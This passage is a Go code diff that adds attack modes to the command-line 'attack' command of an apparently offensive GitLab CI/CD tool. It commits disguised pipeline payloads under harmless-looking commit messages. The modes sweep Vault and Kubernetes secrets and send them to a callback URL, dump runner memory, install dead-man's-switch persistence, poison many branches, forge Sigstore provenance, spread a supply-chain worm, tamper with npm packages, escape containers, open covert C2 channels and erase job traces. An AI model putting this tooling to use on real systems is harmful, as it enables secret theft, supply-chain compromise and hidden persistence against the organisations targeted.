+				VaultAddr:   strings.TrimSpace(atkVaultAddr),
+				AuthMethod:  strings.TrimSpace(atkVaultAuthMethod),
+				CallbackURL: strings.TrimSpace(atkWebhook),
+			})
+			finalBranch, err := commitPayloadToBranch(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail, atkMessage, yaml)
+			if err != nil {
+				return fmt.Errorf("commit vault enum payload: %w", err)
+			}
+			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed vault enum payload to branch %s\n", finalBranch)
+			if outputJSON {
+				out := struct {
+					Branch     string `json:"branch"`
+					VaultAddr  string `json:"vault_addr,omitempty"`
+					AuthMethod string `json:"auth_method,omitempty"`
+				}{
+					Branch:     finalBranch,
+					VaultAddr:  strings.TrimSpace(atkVaultAddr),
+					AuthMethod: strings.TrimSpace(atkVaultAuthMethod),
+				}
+				b, _ := json.MarshalIndent(out, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
+			}
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Vault enum payload committed to branch %s", finalBranch))
+			return nil
+		}
+
+		// k8s-secrets mode: sweep Kubernetes secrets via runner pod service account
+		if atkK8sSecrets {
+			if strings.TrimSpace(atkBranch) == "" {
+				atkBranch = "gogatoz-k8s-secrets"
+			}
+			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
+			if berr != nil {
+				return berr
+			}
+			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
+			if _, err := att.SetupUser(ctx); err != nil {
+				return fmt.Errorf("setup user: %w", err)
+			}
+			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
+				return err
+			}
+			if strings.TrimSpace(atkMessage) == "" {
+				atkMessage = "ci: add kubernetes integration tests"
+			}
+			var ns []string
+			if s := strings.TrimSpace(atkK8sNamespaces); s != "" {
+				for n := range strings.SplitSeq(s, ",") {
+					n = strings.TrimSpace(n)
+					if n != "" {
+						ns = append(ns, n)
+					}
+				}
+			}
+			yaml := payloadgen.GenerateK8sSecretsYAML(payloadgen.K8sSecretsOptions{
+				Common: payloadgen.CommonOptions{
+					JobName: strings.TrimSpace(atkJobName),
+					Stage:   strings.TrimSpace(atkStage),
+					Image:   strings.TrimSpace(atkImage),
+					Tags:    parseTags(atkTags),
+					Manual:  atkManual,
+				},
+				Namespaces:  ns,
+				CallbackURL: strings.TrimSpace(atkWebhook),
+			})
+			if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
+				return fmt.Errorf("commit k8s secrets payload: %w", err)
+			}
+			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed k8s secrets payload to branch %s\n", finalBranch)
+			if outputJSON {
+				out := struct {
+					Branch     string   `json:"branch"`
+					Namespaces []string `json:"namespaces,omitempty"`
+				}{
+					Branch:     finalBranch,
+					Namespaces: ns,
+				}
+				b, _ := json.MarshalIndent(out, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
+			}
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("K8s secrets payload committed to branch %s", finalBranch))
+			return nil
+		}
+
+		// dead-man-switch mode: install persistence with token revocation detection
+		if atkDeadManSwitch {
+			if strings.TrimSpace(atkBranch) == "" {
+				atkBranch = "gogatoz-dms"
+			}
+			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
+			if berr != nil {
+				return berr
+			}
+			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
+			if _, err := att.SetupUser(ctx); err != nil {
+				return fmt.Errorf("setup user: %w", err)
+			}
+			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
+				return err
+			}
+			if strings.TrimSpace(atkMessage) == "" {
+				atkMessage = "ci: add health monitoring"
+			}
+			yaml := payloadgen.GenerateDeadManSwitchYAML(payloadgen.DeadManSwitchOptions{
+				Common: payloadgen.CommonOptions{
+					JobName: strings.TrimSpace(atkJobName),
+					Stage:   strings.TrimSpace(atkStage),
+					Image:   strings.TrimSpace(atkImage),
+					Tags:    parseTags(atkTags),
+					Manual:  atkManual,
+				},
+				MonitorURL:    strings.TrimSpace(atkDMSMonitorURL),
+				CheckInterval: strings.TrimSpace(atkDMSInterval),
+				TTL:           strings.TrimSpace(atkDMSTTL),
+				Handler:       strings.TrimSpace(atkDMSHandler),
+				Platform:      strings.TrimSpace(atkDMSPlatform),
+			})
+			if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
+				return fmt.Errorf("commit dead man switch payload: %w", err)
+			}
+			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed dead man switch payload to branch %s\n", finalBranch)
+			if outputJSON {
+				out := struct {
+					Branch   string `json:"branch"`
+					Platform string `json:"platform,omitempty"`
+					Handler  string `json:"handler,omitempty"`
+				}{
+					Branch:   finalBranch,
+					Platform: strings.TrimSpace(atkDMSPlatform),
+					Handler:  strings.TrimSpace(atkDMSHandler),
+				}
+				b, _ := json.MarshalIndent(out, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
+			}
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Dead Man's Switch payload committed to branch %s", finalBranch))
+			return nil
+		}
+
+		// branch-mutator mode: mass branch CI poisoning via GitLab SDK
+		if atkBranchMutator {
+			content := strings.TrimSpace(atkMutatorContent)
+			if content == "" {
+				// Generate a default CI payload if no content provided
+				ci, cerr := renderPayload()
+				if cerr == nil && strings.TrimSpace(ci) != "" {
+					content = ci
+				}
+			}
+			if content == "" {
+				content = "stages: [test]\nmutated:\n  stage: test\n  script: [echo mutated]\n"
+			}
+			maxBranches := atkMutatorMaxBranches
+			if maxBranches <= 0 {
+				maxBranches = 10
+			}
+			opts := payloadgen.BranchMutatorOptions{
+				FilePath:    strings.TrimSpace(atkMutatorFile),
+				FileContent: content,
+				MaxBranches: maxBranches,
+				CallbackURL: strings.TrimSpace(atkWebhook),
+			}
+			result := payloadgen.RunBranchMutator(ctx, client.GL, atkTarget, opts, atkAuthorName, atkAuthorEmail, cmd.ErrOrStderr())
+			if outputJSON {
+				b, _ := json.MarshalIndent(result, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
+			}
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Branch mutator: %d/%d branches mutated", result.Mutated, result.Targeted))
+			if result.Errors > 0 {
+				renderWarning(cmd.OutOrStdout(), fmt.Sprintf("%d errors encountered", result.Errors))
+			}
+			return nil
+		}
+
+		// sigstore mode: forge Sigstore provenance attestations
+		if atkSigstore { //nolint:dupl // structurally similar to vault-enum handler but different YAML generation and JSON output
+			if strings.TrimSpace(atkBranch) == "" {
+				atkBranch = "gogatoz-sigstore"
+			}
+			if strings.TrimSpace(atkMessage) == "" {
+				atkMessage = "ci: add provenance attestation"
+			}
+			yaml := payloadgen.GenerateSigstoreYAML(payloadgen.SigstoreOptions{
+				Common: payloadgen.CommonOptions{
+					JobName: strings.TrimSpace(atkJobName),
+					Stage:   strings.TrimSpace(atkStage),
+					Image:   strings.TrimSpace(atkImage),
+					Tags:    parseTags(atkTags),
+					Manual:  atkManual,
+				},
+				PackageName: strings.TrimSpace(atkSigstorePackage),
+				Version:     strings.TrimSpace(atkSigstoreVersion),
+				CallbackURL: strings.TrimSpace(atkWebhook),
+			})
+			finalBranch, err := commitPayloadToBranch(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail, atkMessage, yaml)
+			if err != nil {
+				return fmt.Errorf("commit sigstore payload: %w", err)
+			}
+			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed sigstore provenance payload to branch %s\n", finalBranch)
+			if outputJSON {
+				out := struct {
+					Branch      string `json:"branch"`
+					PackageName string `json:"package_name,omitempty"`
+					Version     string `json:"version,omitempty"`
+				}{
+					Branch:      finalBranch,
+					PackageName: strings.TrimSpace(atkSigstorePackage),
+					Version:     strings.TrimSpace(atkSigstoreVersion),
+				}
+				b, _ := json.MarshalIndent(out, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
+			}
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Sigstore provenance payload committed to branch %s", finalBranch))
+			return nil
+		}
+
 		// secrets mode
 		if atkSecrets {
 			// parse tags
 			var tags []string
 			if strings.TrimSpace(atkTags) != "" {
-				for _, t := range strings.Split(atkTags, ",") {
+				for t := range strings.SplitSeq(atkTags, ",") {
 					t = strings.TrimSpace(t)
 					if t != "" {
 						tags = append(tags, t)
@@ -1329,10 +2233,10 @@ var attackCmd = &cobra.Command{
 		if strings.TrimSpace(atkPayload) != "" {
 			lp := strings.ToLower(strings.TrimSpace(atkPayload))
 			if (lp == payloadRor || lp == payloadRunnerOnRunner || lp == payloadRunnerOnRunnerAlt) && strings.TrimSpace(atkTags) == "" {
-				tags, _, derr := ror.DiscoverProjectRunnerTags(ctx, client, atkTarget)
+				tags, _, derr := rorpkg.DiscoverProjectRunnerTags(ctx, client, atkTarget)
 				if derr == nil {
 					if strings.TrimSpace(atkExecutor) != "" {
-						tags = ror.FilterTagsByExecutor(tags, atkExecutor)
+						tags = rorpkg.FilterTagsByExecutor(tags, atkExecutor)
 					}
 					if len(tags) > 0 {
 						atkTags = strings.Join(tags, ",")
@@ -1556,6 +2460,67 @@ func init() {
 	attackCmd.Flags().StringVar(&atkCleanupJobsRef, "cleanup-jobs-ref", "", "Limit job trace erasure to pipelines on this ref/branch")
 	attackCmd.Flags().IntVar(&atkCleanupJobsMax, "cleanup-jobs-max", 5, "Max recent pipelines to erase job traces from (default: 5)")
 	attackCmd.Flags().BoolVar(&atkCleanupJobsDelete, "cleanup-jobs-delete", false, "Also delete pipelines after erasing their job traces")
+	// ROR shell listener flags
+	attackCmd.Flags().BoolVar(&atkRorListen, "ror-listen", false, "Start a built-in HTTP listener to receive exfiltrated data from ror-shell payloads (requires --commit-ci)")
+	attackCmd.Flags().StringVar(&atkRorListenAddr, "ror-listen-addr", ":9444", "HTTP listen address for the ror-shell listener")
+	attackCmd.Flags().StringVar(&atkRorListenTimeout, "ror-listen-timeout", "10m", "Timeout for waiting on ror-shell exfil callbacks")
+	// Memory dump mode flags
+	attackCmd.Flags().BoolVar(&atkMemoryDump, "memory-dump", false, "Inject a CI job that dumps secrets from runner process memory (bypasses masked vars)")
+	attackCmd.Flags().StringVar(&atkMemoryDumpProc, "memory-dump-proc", "", "/proc/<pid> to dump (auto-detect if empty)")
+	attackCmd.Flags().StringVar(&atkMemoryDumpFilter, "memory-dump-filter", "", "Regex to filter variables (default: .*SECRET|.*TOKEN|.*KEY)")
+	// Supply chain worm mode flags
+	attackCmd.Flags().BoolVar(&atkSupplyChainWorm, "supply-chain-worm", false, "Self-propagating CI injection across sibling repos (Canisterworm-style)")
+	attackCmd.Flags().StringVar(&atkWormPayload, "worm-payload", "", "Payload to inject into sibling repos")
+	attackCmd.Flags().IntVar(&atkWormMaxRepos, "worm-max-repos", 5, "Max sibling repos to propagate to")
+	attackCmd.Flags().StringVar(&atkWormTargetGroup, "worm-target-group", "", "Group ID/path to scope worm propagation")
+	// Container escape mode flags
+	attackCmd.Flags().BoolVar(&atkContainerEscape, "container-escape", false, "Exploit privileged Docker executor to escape to host")
+	attackCmd.Flags().StringVar(&atkEscapeMountPath, "escape-mount-path", "/", "Host path to mount (default: /)")
+	attackCmd.Flags().StringVar(&atkEscapeMethod, "escape-method", "docker", "Escape method: sshd|docker|kernel|nsenter (default: docker)")
+	attackCmd.Flags().StringVar(&atkEscapeCommand, "escape-command", "bash", "Command to execute on host (default: bash)")
+	// Variable injection mode flags
+	attackCmd.Flags().BoolVar(&atkVariableInject, "variable-inject", false, "Inject malicious CI variables into project/group scope")
+	attackCmd.Flags().StringVar(&atkInjectVars, "inject-vars", "", "JSON string of var key=value pairs to inject")
+	attackCmd.Flags().StringVar(&atkInjectScope, "inject-scope", "project", "Injection scope: project|group")
+	attackCmd.Flags().StringVar(&atkInjectGroupID, "inject-group-id", "", "Group ID for group-scope injection")
+	attackCmd.Flags().BoolVar(&atkInjectProtected, "inject-protected", false, "Inject as protected variable")
+	attackCmd.Flags().BoolVar(&atkInjectMasked, "inject-masked", false, "Inject as masked variable")
+	// C2 covert channel mode flags
+	attackCmd.Flags().BoolVar(&atkC2Channel, "c2-channel", false, "Establish a covert C2 channel via DNS tunnel, steganography, ICMP")
+	attackCmd.Flags().StringVar(&atkC2Method, "c2-method", "dns-a", "C2 method: dns-a|dns-txt|steg-wav|steg-png|icmp (default: dns-a)")
+	attackCmd.Flags().StringVar(&atkC2Target, "c2-target", "", "Domain/URL for the C2 channel")
+	attackCmd.Flags().BoolVar(&atkC2KeepAlive, "c2-keepalive", false, "Keep C2 channel alive with heartbeats")
+	attackCmd.Flags().StringVar(&atkC2CallbackURL, "c2-callback-url", "", "C2 callback URL")
+	// npm tamper mode flags
+	attackCmd.Flags().BoolVar(&atkNpmTamper, "npm-tamper", false, "Inject preinstall hooks into npm packages via CI (supply chain attack)")
+	attackCmd.Flags().StringVar(&atkNpmRegistry, "npm-registry", "", "npm registry URL (default: https://registry.npmjs.org)")
+	attackCmd.Flags().StringVar(&atkNpmPackage, "npm-package", "", "Specific npm package to tamper (auto-discover if empty)")
+	attackCmd.Flags().StringVar(&atkNpmInjectScript, "npm-inject-script", "", "Preinstall hook content to inject into package.json")
+	// Vault enumeration mode flags
+	attackCmd.Flags().BoolVar(&atkVaultEnum, "vault-enum", false, "Enumerate and exfiltrate secrets from reachable HashiCorp Vault instances")
+	attackCmd.Flags().StringVar(&atkVaultAddr, "vault-addr", "", "Vault server URL (falls back to $VAULT_ADDR)")
+	attackCmd.Flags().StringVar(&atkVaultAuthMethod, "vault-auth-method", "", "Vault auth method: token|kubernetes|aws (default: token)")
+	// K8s secrets sweep mode flags
+	attackCmd.Flags().BoolVar(&atkK8sSecrets, "k8s-secrets", false, "Sweep Kubernetes secrets via runner pod service account")
+	attackCmd.Flags().StringVar(&atkK8sNamespaces, "k8s-namespaces", "", "Comma-separated Kubernetes namespaces to target (empty = discover all)")
+	// Dead Man's Switch mode flags
+	attackCmd.Flags().BoolVar(&atkDeadManSwitch, "dead-man-switch", false, "Install persistence with token revocation detection (Dead Man's Switch)")
+	attackCmd.Flags().StringVar(&atkDMSMonitorURL, "dms-monitor-url", "", "Endpoint to probe with token (default: GitLab /api/v4/user)")
+	attackCmd.Flags().StringVar(&atkDMSInterval, "dms-interval", "", "Seconds between checks (default: 60)")
+	attackCmd.Flags().StringVar(&atkDMSTTL, "dms-ttl", "", "Seconds before self-removal (default: 86400)")
+	attackCmd.Flags().StringVar(&atkDMSHandler, "dms-handler", "", "Command to run on token revocation")
+	attackCmd.Flags().StringVar(&atkDMSPlatform, "dms-platform", "", "Platform: linux|macos (default: linux)")
+	// Branch mutator mode flags
+	attackCmd.Flags().BoolVar(&atkBranchMutator, "branch-mutator", false, "Iterate unprotected branches and commit a file to each (mass CI poisoning)")
+	attackCmd.Flags().StringVar(&atkMutatorFile, "mutator-file", "", "File to create/update on each branch (default: .gitlab-ci.yml)")
+	attackCmd.Flags().StringVar(&atkMutatorContent, "mutator-content", "", "Content to write to each branch")
+	attackCmd.Flags().IntVar(&atkMutatorMaxBranches, "mutator-max-branches", 10, "Max branches to target (default: 10)")
+	// Sigstore provenance forgery mode flags
+	attackCmd.Flags().BoolVar(&atkSigstore, "sigstore", false, "Forge Sigstore provenance attestations via CI OIDC tokens")
+	attackCmd.Flags().StringVar(&atkSigstorePackage, "sigstore-package", "", "Package name for the attestation subject")
+	attackCmd.Flags().StringVar(&atkSigstoreVersion, "sigstore-version", "", "Package version for the attestation")
+	// Shared co-author trailer
+	attackCmd.Flags().StringVar(&atkCoAuthor, "co-author", "", "Co-Authored-By trailer for commits")
 }
 
 func loadCIContent(inline, file string, fromStdin bool) (string, error) {
@@ -1592,7 +2557,7 @@ func renderPayload() (string, error) {
 	// Build common options
 	var tags []string
 	if strings.TrimSpace(atkTags) != "" {
-		for _, t := range strings.Split(atkTags, ",") {
+		for t := range strings.SplitSeq(atkTags, ",") {
 			t = strings.TrimSpace(t)
 			if t != "" {
 				tags = append(tags, t)
@@ -1663,7 +2628,171 @@ func renderPayload() (string, error) {
 			MemoryDump:      atkTamperTagMemDump,
 			Extended:        atkTamperTagExtended,
 		}), nil
+	case "memory-dump", "memory_dump", "memorydump":
+		c2 := strings.TrimSpace(atkWebhook)
+		return payloadgen.GenerateMemoryDumpYAML(payloadgen.MemoryDumpOptions{
+			Common:      common,
+			CallbackURL: c2,
+			ProcScan:    true,
+			MemoryDump:  true,
+			Extended:    true,
+		}), nil
+	case "supplychain-worm", "supplychain_worm", "supplychainworm":
+		return payloadgen.GenerateSupplyChainWormYAML(payloadgen.SupplyChainWormOptions{
+			Common:      common,
+			CallbackURL: strings.TrimSpace(atkWebhook),
+			ExfilMethod: strings.TrimSpace(atkExfilMethod),
+			ExfilTarget: strings.TrimSpace(atkExfilTarget),
+		}), nil
+	case "container-escape", "container_escape", "containerescape":
+		return payloadgen.GenerateContainerEscapeYAML(payloadgen.ContainerEscapeOptions{
+			Common:       common,
+			EscapeMethod: strings.TrimSpace(atkEscapeMethod),
+			EscapeCmd:    strings.TrimSpace(atkEscapeCommand),
+			MountPath:    strings.TrimSpace(atkEscapeMountPath),
+			HostCommand:  strings.TrimSpace(atkCmd),
+			ExfilMethod:  strings.TrimSpace(atkExfilMethod),
+			ExfilTarget:  strings.TrimSpace(atkExfilTarget),
+		}), nil
+	case "variable-inject", "variable_inject", "variableinject", "var-inject":
+		return payloadgen.GenerateVariableInjectionYAML(payloadgen.VariableInjectionOptions{
+			Common:      common,
+			CallbackURL: strings.TrimSpace(atkWebhook),
+		}), nil
+	case "c2-channels", "c2_channels", "c2channels", "c2-channel", "c2channel":
+		return payloadgen.GenerateC2ChannelYAML(payloadgen.C2ChannelOptions{
+			Common:      common,
+			ExfilMethod: strings.TrimSpace(atkC2Method),
+			ExfilTarget: strings.TrimSpace(atkC2Target),
+			KeepAlive:   atkC2KeepAlive,
+			CallbackURL: strings.TrimSpace(atkC2CallbackURL),
+		}), nil
+	case "npm-tamper", "npm_tamper", "npmtamper":
+		return payloadgen.GenerateNpmTamperYAML(payloadgen.NpmTamperOptions{
+			Common:         common,
+			RegistryURL:    strings.TrimSpace(atkNpmRegistry),
+			PackageName:    strings.TrimSpace(atkNpmPackage),
+			InjectedScript: strings.TrimSpace(atkNpmInjectScript),
+			CallbackURL:    strings.TrimSpace(atkWebhook),
+		}), nil
+	case "vault-enum", "vault_enum", "vaultenum":
+		return payloadgen.GenerateVaultEnumYAML(payloadgen.VaultEnumOptions{
+			Common:      common,
+			VaultAddr:   strings.TrimSpace(atkVaultAddr),
+			AuthMethod:  strings.TrimSpace(atkVaultAuthMethod),
+			CallbackURL: strings.TrimSpace(atkWebhook),
+		}), nil
+	case "k8s-secrets", "k8s_secrets", "k8ssecrets":
+		var ns []string
+		if s := strings.TrimSpace(atkK8sNamespaces); s != "" {
+			for n := range strings.SplitSeq(s, ",") {
+				n = strings.TrimSpace(n)
+				if n != "" {
+					ns = append(ns, n)
+				}
+			}
+		}
+		return payloadgen.GenerateK8sSecretsYAML(payloadgen.K8sSecretsOptions{
+			Common:      common,
+			Namespaces:  ns,
+			CallbackURL: strings.TrimSpace(atkWebhook),
+		}), nil
+	case "dead-mans-switch", "dead_mans_switch", "deadmanswitch", "dms":
+		return payloadgen.GenerateDeadManSwitchYAML(payloadgen.DeadManSwitchOptions{
+			Common:        common,
+			MonitorURL:    strings.TrimSpace(atkDMSMonitorURL),
+			CheckInterval: strings.TrimSpace(atkDMSInterval),
+			TTL:           strings.TrimSpace(atkDMSTTL),
+			Handler:       strings.TrimSpace(atkDMSHandler),
+			Platform:      strings.TrimSpace(atkDMSPlatform),
+		}), nil
+	case "branch-mutator", "branch_mutator", "branchmutator":
+		return payloadgen.GenerateBranchMutatorYAML(payloadgen.BranchMutatorOptions{
+			Common:      common,
+			FilePath:    strings.TrimSpace(atkMutatorFile),
+			FileContent: strings.TrimSpace(atkMutatorContent),
+			MaxBranches: atkMutatorMaxBranches,
+			CallbackURL: strings.TrimSpace(atkWebhook),
+		}), nil
+	case "sigstore", "sigstore-provenance":
+		return payloadgen.GenerateSigstoreYAML(payloadgen.SigstoreOptions{
+			Common:      common,
+			PackageName: strings.TrimSpace(atkSigstorePackage),
+			Version:     strings.TrimSpace(atkSigstoreVersion),
+			CallbackURL: strings.TrimSpace(atkWebhook),
+		}), nil
 	default:
 		return "", fmt.Errorf("unsupported --payload: %s", atkPayload)
 	}
+}
+
+// newRorShellListener creates a new ror listener instance.
+func newRorShellListener(listenAddr string, out io.Writer) *Listener {
+	return NewListener(listenAddr, out)
+}
+
+// resultsToMap converts listener results to a map of maps for DB persistence.
+func resultsToMap(results []*CallbackResult) map[string]string {
+	combined := make(map[string]string)
+	for _, r := range results {
+		maps.Copy(combined, r.Secrets)
+	}
+	return combined
+}
+
+// parsePipelineURL extracts the pipeline ID from a GitLab pipeline URL string.
+// URL format: https://gitlab.com/group/project/-/pipelines/123
+func parsePipelineURL(pipelineURL string) (int64, error) {
+	parts := strings.Split(pipelineURL, "/")
+	for i := len(parts) - 1; i >= 0; i-- {
+		if parts[i] == "pipelines" && i+1 < len(parts) {
+			var id int64
+			_, err := fmt.Sscanf(parts[i+1], "%d", &id)
+			return id, err
+		}
+	}
+	return 0, nil
+}
+
+// parseTags splits a comma-separated tag string into a slice.
+func parseTags(raw string) []string {
+	var tags []string
+	if strings.TrimSpace(raw) != "" {
+		for t := range strings.SplitSeq(raw, ",") {
+			t = strings.TrimSpace(t)
+			if t != "" {
+				tags = append(tags, t)
+			}
+		}
+	}
+	return tags
+}
+
+// commitPayloadToBranch handles the common pattern of: deconflict branch →
+// create attacker → setup user → ensure branch → upsert .gitlab-ci.yml.
+// Returns the resolved branch name on success.
+func commitPayloadToBranch(ctx context.Context, client *gitlabx.Client, target, branch, deconflict, authorName, authorEmail, message, yaml string) (string, error) {
+	finalBranch, err := ensureBranchDeconflict(ctx, client, target, branch, deconflict, authorName, authorEmail)
+	if err != nil {
+		return "", err
+	}
+	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), authorName, authorEmail, 0)
+	if _, err := att.SetupUser(ctx); err != nil {
+		return "", fmt.Errorf("setup user: %w", err)
+	}
+	if err := att.EnsureBranch(ctx, target, finalBranch); err != nil {
+		return "", err
+	}
+	if err := att.UpsertFile(ctx, target, finalBranch, ".gitlab-ci.yml", yaml, message); err != nil {
+		return "", err
+	}
+	return finalBranch, nil
+}
+
+// ifErr returns err.Error() or empty string — used inline in variable-inject JSON output.
+func ifErr(err error) string {
+	if err != nil {
+		return err.Error()
+	}
+	return ""
 }
